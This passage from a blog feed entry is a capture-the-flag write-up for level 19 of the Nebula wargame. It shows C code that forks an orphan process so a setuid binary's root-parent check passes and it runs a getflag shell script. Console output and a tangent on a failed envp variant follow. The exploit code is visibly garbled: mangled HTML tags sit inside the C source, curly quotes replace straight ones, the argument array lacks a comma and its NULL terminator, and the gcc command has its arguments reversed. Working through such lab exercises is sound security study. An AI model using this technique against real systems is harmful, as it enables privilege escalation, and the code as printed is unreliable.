<p>The password doesn’t seem to work for logging into the <code>flag18</code> account, but the shell can execute <code>getflag</code>.</p>

<h2 id="level-19">Level 19</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code>flag19</code> executable checks if the root user started the process. If so, then it runs <code>execve</code> on <code>/bin/sh</code>.</p>

<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won’t end up taking the class, but I should show my appreciation for the lecture notes – they’re all very well made.</p>

<p>We want to start <code>flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code>init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>

<ol>
  <li>Use <code>fork()</code> to create a child process, exit the parent process, and <code>sleep()</code> to create an orphan.</li>
  <li>Execute <code>/home/flag19/flag19</code> with our arguments The <code>stat</code> should complete successfully, as we control the time of check.</li>
</ol>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// attempt.c&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span> <span class="n">id</span><span class="o">=</span><span class="s">&quot;include-stdlibh&quot;</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;&lt;/stdio.h&gt;&lt;/unistd.h&gt;&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="n">executing</span> <span class="n">code</span> <span class="n">in</span> <span class="n">orphan</span><span class="err">…\</span><span class="n">n</span><span class="err">”</span><span class="p">);</span>
		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
		<span class="kt">char</span> <span class="o">*</span><span class="n">flag19_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="err">“</span><span class="o">-</span><span class="n">c</span><span class="err">”</span> <span class="err">“</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">level19</span><span class="o">/</span><span class="n">run19</span><span class="p">.</span><span class="n">sh</span><span class="err">”</span> <span class="p">};</span>
		<span class="n">execv</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flag19</span><span class="o">/</span><span class="n">flag19</span><span class="err">”</span><span class="p">,</span> <span class="n">flag19_args</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="n">returning</span> <span class="n">from</span> <span class="n">parent</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="err">“</span><span class="n">sanity</span> <span class="n">check</span><span class="p">,</span> <span class="n">outside</span> <span class="n">both</span> <span class="o">-</span> <span class="n">should</span> <span class="n">never</span> <span class="n">happen</span><span class="err">\</span><span class="n">n</span><span class="err">”</span><span class="p">);</span>
<span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash.sh</span>
<span class="c"># /home/level19/run19.sh</span>
<span class="c"># Standard getflag wrapper</span>
<span class="nv">file</span><span class="o">=</span>/home/flag19/getflag19.log
getflag <span class="p">&amp;</span>gt<span class="p">;</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span>
id » <span class="k">${</span><span class="nv">file</span><span class="k">}</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc -o attempt.c attempt
<span class="gp">$</span> ./attempt
<span class="go">returning from parent</span>
<span class="gp">$</span> executing code in orphan…
<span class="gp">$</span> cat /home/flag19/getflag19.log
<span class="go">You have successfully executed getflag on a target account</span>
<span class="go">uid=1020(level19) …</span></code></pre></div></p>

<h3 id="tangent">Tangent</h3>
<p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>

<p>The code below does <strong>not</strong> run <code>execve</code> as suid. It runs it as the user <code>level19</code> instead of <code>flag19</code>, which may have been caused by passing down <code>envp</code>.</p>

<p><div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span> <span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="c1">// our other code…</span>
		<span class="n">execve</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flag19</span><span class="o">/</span><span class="n">flag19</span><span class="err">”</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></div></p>

<p>This meant that I could conveniently pass arguments through the executable:</p>

<p><div class="highlight"><pre><code class="language-text" data-lang="text">gcc attempt.c -o attempt
./attempt “/home/level19/run19.sh”</code></pre></div></p>

<p>Unfortunately, it also meant that <code>getflag</code> wouldn’t execute on the correct user.</p>
]]></content>
  </entry>
  
</feed>
